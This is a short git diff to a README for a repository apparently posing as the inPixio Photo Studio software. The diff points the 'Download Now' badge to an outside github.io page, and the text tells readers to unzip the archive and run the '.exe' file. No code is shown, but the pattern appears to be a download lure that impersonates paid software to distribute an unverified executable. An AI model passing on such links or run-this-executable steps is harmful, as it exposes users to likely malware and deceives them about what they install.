@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://inpixio-photo-studio.github.io/.github/)
 
 ## 📸 Overview
 ![inpixio-photo-studio-background](https://github.com/user-attachments/assets/b0ff9075-db24-4801-b7df-2d6ffedc2fca)
